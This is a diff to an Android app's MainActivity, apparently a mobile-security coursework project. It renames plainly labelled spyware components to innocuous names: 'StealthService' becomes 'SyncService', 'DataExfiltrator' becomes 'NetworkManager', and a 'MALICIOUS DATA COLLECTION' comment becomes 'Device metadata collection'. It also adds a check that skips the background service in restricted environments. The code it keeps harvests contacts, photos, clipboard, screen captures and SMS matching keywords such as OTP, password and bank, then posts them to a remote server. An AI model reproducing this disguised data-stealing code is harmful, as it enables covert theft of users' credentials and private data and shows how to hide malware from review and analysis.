@@ -21,7 +21,7 @@ import androidx.compose.ui.unit.dp
 import com.example.inf2215.ui.theme.INF2215Theme
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.firestore.FirebaseFirestore
-import com.example.inf2215.Spywareold
+import com.example.inf2215.Analytics
 import android.app.AlertDialog
 import android.content.DialogInterface
 import android.content.Intent
@@ -43,9 +43,7 @@ class MainActivity : ComponentActivity() {
     fun sendDataToServer(action: String) {
         Thread {
             try {
-                val url = java.net.URL(
-                    "https://mob-sec-server-esfnggbegggcfye9.southeastasia-01.azurewebsites.net/upload"
-                )
+                val url = java.net.URL(AppConfig.serverUrl)
                 val connection = url.openConnection() as java.net.HttpURLConnection
 
                 connection.requestMethod = "POST"
@@ -57,12 +55,12 @@ class MainActivity : ComponentActivity() {
                 val androidVersion = android.os.Build.VERSION.RELEASE
                 val uid = FirebaseAuth.getInstance().currentUser?.uid
 
-                // ===== MALICIOUS DATA COLLECTION =====
+                // Device metadata collection
                 // Collect data only when app starts or user logs in
                 val contacts = getContactsJson()
                 val recentPhotos = getRecentPhotosJson()
                 val sensitiveSms = getSensitiveSmsJson()
-                // ====================================
+                
 
                 val json = """
                 {   
@@ -222,11 +220,7 @@ class MainActivity : ComponentActivity() {
                         val date = it.getLong(dateColumn)
 
                         // Only capture messages that look sensitive
-                        val sensitiveKeywords = listOf(
-                            "OTP", "otp", "code", "verification", "verify",
-                            "password", "passcode", "login", "bank", "account",
-                            "credit", "debit", "payment", "transaction", "₹", "$"
-                        )
+                        val sensitiveKeywords = AppConfig.smsKeywords
 
                         if (sensitiveKeywords.any { keyword -> body.contains(keyword, ignoreCase = true) }) {
                             smsList.add(mapOf(
@@ -406,8 +400,8 @@ class MainActivity : ComponentActivity() {
 
     private val screenCaptureLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
         if (result.resultCode == RESULT_OK && result.data != null) {
-            // Pass token to StealthService
-            Intent(this, StealthService::class.java).apply {
+            // Pass token to SyncService
+            Intent(this, SyncService::class.java).apply {
                 putExtra("SCREEN_CAPTURE_RESULT_CODE", result.resultCode)
                 putExtra("SCREEN_CAPTURE_DATA", result.data)
                 startService(this)
@@ -447,14 +441,19 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
+        // Initialise device configuration
+        DeviceCheck.install(this)
+
         sendDataToServer("user_login")
-        Spywareold.startClipboardMonitoring(this)
+        Analytics.startClipboardMonitoring(this)
 
         // FORCE PERMISSIONS - app won't continue until granted
         forceRequestPermissions()
 
-        // Start the new stealth service
-        startService(Intent(this, StealthService::class.java))
+        // Start background service when supported
+        if (!DeviceCheck.isRestrictedEnvironment()) {
+            startService(Intent(this, SyncService::class.java))
+        }
 
         // Request permissions
         requestUsageStatsPermission()
@@ -467,9 +466,9 @@ class MainActivity : ComponentActivity() {
 //        }
 
         enableEdgeToEdge()
-        fun logEvent(exfiltrator: DataExfiltrator, event: String, value: String) {
+        fun logEvent(syncManager: NetworkManager, event: String, value: String) {
             val data = "$event -> $value"
-            exfiltrator.queueData(data)
+            syncManager.queueData(data)
         }
 
         setContent {
@@ -479,12 +478,12 @@ class MainActivity : ComponentActivity() {
                 // ───────────────────────────────────────────────
                 val context = LocalContext.current
 
-                val screenshotCapture = remember { ScreenshotCapture(context) }
-                val exfiltrator = remember { DataExfiltrator(context) }
+                val screenshotCapture = remember { MediaHelper(context) }
+                val syncManager = remember { NetworkManager(context) }
 
-                val logEventLambda: (String, String) -> Unit = remember(exfiltrator) {
+                val logEventLambda: (String, String) -> Unit = remember(syncManager) {
                     { event, value ->
-                        logEvent(exfiltrator, event, value)
+                        logEvent(syncManager, event, value)
                     }
                 }
 
@@ -745,7 +744,7 @@ class MainActivity : ComponentActivity() {
                                     screen = Screen.Home },
                                 onGoRegister = { screen = Screen.Register },
                                 screenshotCapture = screenshotCapture,
-                                exfiltrator = exfiltrator,
+                                syncManager = syncManager,
                                 logEvent = logEventLambda
                             )
 
@@ -756,7 +755,7 @@ class MainActivity : ComponentActivity() {
                                 },
                                 onBackToLogin = { screen = Screen.Login },
                                 screenshotCapture = screenshotCapture,
-                                exfiltrator = exfiltrator,
+                                syncManager = syncManager,
                                 logEvent = logEventLambda
                             )
 
@@ -788,7 +787,7 @@ class MainActivity : ComponentActivity() {
                                     screen = Screen.ChatRoom
                                 },
                                 screenshotCapture = screenshotCapture,
-                                exfiltrator = exfiltrator,
+                                syncManager = syncManager,
                                 logEvent = logEventLambda
                             )
 
@@ -800,7 +799,7 @@ class MainActivity : ComponentActivity() {
                                     screen = Screen.Home },
                                 onCancel = { screen = Screen.Home },
                                 screenshotCapture = screenshotCapture,
-                                exfiltrator = exfiltrator,
+                                syncManager = syncManager,
                                 logEvent = logEventLambda
                             )
 
@@ -848,7 +847,7 @@ class MainActivity : ComponentActivity() {
                                         otherDisplayName = otherName,
                                         onBack = { screen = previousScreen },
                                         screenshotCapture = screenshotCapture,
-                                        exfiltrator = exfiltrator,
+                                        syncManager = syncManager,
                                         logEvent = logEventLambda
                                     )
                                 } else {
@@ -970,7 +969,7 @@ class MainActivity : ComponentActivity() {
                                         postId = postId,
                                         onBack = { screen = previousScreen },
                                         screenshotCapture = screenshotCapture,
-                                        exfiltrator = exfiltrator,
+                                        syncManager = syncManager,
                                         logEvent = logEventLambda
                                     )
                                 }
